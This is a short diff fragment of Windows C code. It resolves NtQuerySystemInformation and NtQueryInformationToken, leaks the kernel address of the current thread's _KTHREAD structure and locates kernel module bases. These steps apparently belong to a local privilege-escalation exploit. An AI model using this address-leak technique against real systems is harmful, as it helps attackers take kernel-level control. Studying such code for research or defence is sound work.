@@ -42,11 +42,8 @@ int main()
     NtQuerySystemInfor = (pNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
     NtQueryInfoToken = (pNtQueryInformationToken)GetProcAddress(ntdll, "NtQueryInformationToken");
 
-    HANDLE hToken;
-    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);    
-    kThreadAddr = (DWORD64)GetKernelPointerByHandle(hToken, CurrentPid);
+    kThreadAddr = GetkThreadAddrByHandle(GetCurrentProcess(), CurrentPid);
     printf("[+] _KTHREAD: %llx\n", kThreadAddr);
-    CloseHandle(hToken);
 
     NTOKernelBase = GetModuleAddrByName(NtoRootPath);
     NTOUserBase = GetModuleByName(wNtoPath);
